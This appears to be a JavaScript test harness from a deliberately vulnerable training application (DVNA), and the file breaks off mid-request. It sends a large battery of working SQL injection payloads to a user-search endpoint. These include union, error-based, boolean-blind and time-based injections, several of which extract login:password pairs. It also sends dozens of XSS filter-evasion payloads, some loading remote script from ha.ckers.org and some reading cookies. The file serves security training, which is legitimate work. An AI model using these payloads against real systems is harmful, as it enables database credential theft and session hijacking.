var htmlEscape = function(str) {
  return str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

var addToResults = function(data, test) {
  var response = data.response,
    msg = data.msg,
    response_data = '',
    className = 'bg-success';

  if (response.data && response.data.length) {
    response_data = JSON.stringify(response.data);
  }
  if (msg === "Internal Error") {
    className = 'bg-danger';
  }

  $(test).append(
    `<div class="${className} lead">
        <p>Request: ${htmlEscape(response.original_request)}</p>
        <p>Response: ${response_data}</p>
      </div>`
  )
}

$('#runSQLTest').on('click', function() {
  var self = this;
  $(this).addClass('disabled');
  $('#automated_results_sql').html('');
  $.when(
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "test"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' UNION ALL SELECT NULL,version() #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1))) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME=\"users\" LIMIT 0,1))) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"table1\" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT version()),1,1))) > 52 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (SELECT version()) LIKE \"5 %\" #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))) > 95 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1))) > 95 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND sleep(10) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF((SELECT version()) LIKE \"5 %\",sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    }),
    // Internal error
    $.ajax({
      type: "POST",
      url: "/app/usersearch",
      data: JSON.stringify([{
        name: "login",
        value: "'"
      }]),
      success: function(data) {
        addToResults(data, '#automated_results_sql')
      },
      error: function(data) {
        addToResults(data, '#automated_results_sql');
      },
      dataType: "json",
      contentType: "application/json"
    })
  ).then(function() {
    $(self).removeClass('disabled');
  });
});



// XSS Atacks
$('#runXSSTest').on('click', function() {
  var self = this;
  $(this).addClass('disabled');
  $('#automated_results_xss').html('');
  $.when(
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "'';!--\"<XSS>= & {()}"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: " <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"javascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=JaVaScRiPt:alert('XSS')>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=`javascript:alert(\"RSnake says,'XSS'\")`>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: " <a onmouseover=\"alert(document.cookie)\">xxs link</a>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<a onmouseover=alert(document.cookie)>xxs link</a>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=# onmouseover=\"alert('xxs')\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG onmouseover=\" alert('xxs')\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\" /\" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"/x\" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"/\" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"/x\" onerror=\"jav ascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"/\" onerror=\"jav & #x09;ascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"jav & #x0A;ascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC=\"/x\" onerror=\"jav & #x0D;ascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: " <SCRIPT/XSS SRC=\"http: //ha.ckers.org/xss.js\"></SCRIPT>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<SCRIPT SRC=//ha.ckers.org/.j>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<iframe src=http://ha.ckers.org/scriptlet.html <"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "</TITLE><SCRIPT>alert(\"XSS \");</SCRIPT>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<INPUT TYPE=\"IMAGE\" SRC=\"javascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<BODY BACKGROUND=\"javascript: alert('XSS')\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG DYNSRC=\"javascript: alert('XSS')\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG LOWSRC=\"javascript: alert('XSS')\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE>li {list-style-image: url(\"javascript: alert('XSS')\");}</STYLE><UL><LI>XSS</br>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG SRC='vbscript:msgbox(\"XSS\")'>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<BODY ONLOAD=alert('XSS')>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<BGSOUND SRC=\"javascript: alert('XSS');\""
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<LINK REL=\"stylesheet\" HREF=\"javascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<LINK REL=\"stylesheet\" HREF=\"http: //ha.ckers.org/xss.css\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: " <META HTTP-EQUIV=\"Link\" Content=\"< http://ha.ckers.org/xss.css>; REL=stylesheet\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE>BODY{-moz-binding:url(\"http: //ha.ckers.org/xssmoz.xml#xss\")}</STYLE>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<IMG STYLE=\"xss: expr /*XSS*/ ession(alert('XSS'))\""
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<STYLE>.XSS{background-image:url(\"javascript: alert('XSS')\");}</STYLE><A CLASS=XSS></A>"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url = javascript: alert('XSS');\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
        value: "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url = data: text / html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"
      }),
      success: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      error: function(data) {
        addToResults(data, '#automated_results_xss')
      },
      dataType: "json",
      contentType: "application/json"
    }),
    $.ajax({
      type: "POST",
      url: "/app/xss",
      data: JSON.stringify({
